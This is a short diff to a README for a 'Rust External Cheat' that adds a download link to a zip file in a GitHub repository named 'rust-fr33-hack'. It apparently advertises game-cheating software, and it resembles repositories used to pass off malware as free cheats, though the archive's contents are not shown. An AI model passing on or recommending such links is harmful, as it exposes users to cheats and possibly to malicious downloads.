@@ -1,6 +1,6 @@
 # Rust External Cheat
 
-* [Download]()
+* [Download](https://github.com/x4oi/rust-fr33-hack/releases/download/download/Rust.zip)
 
 # Information 
 
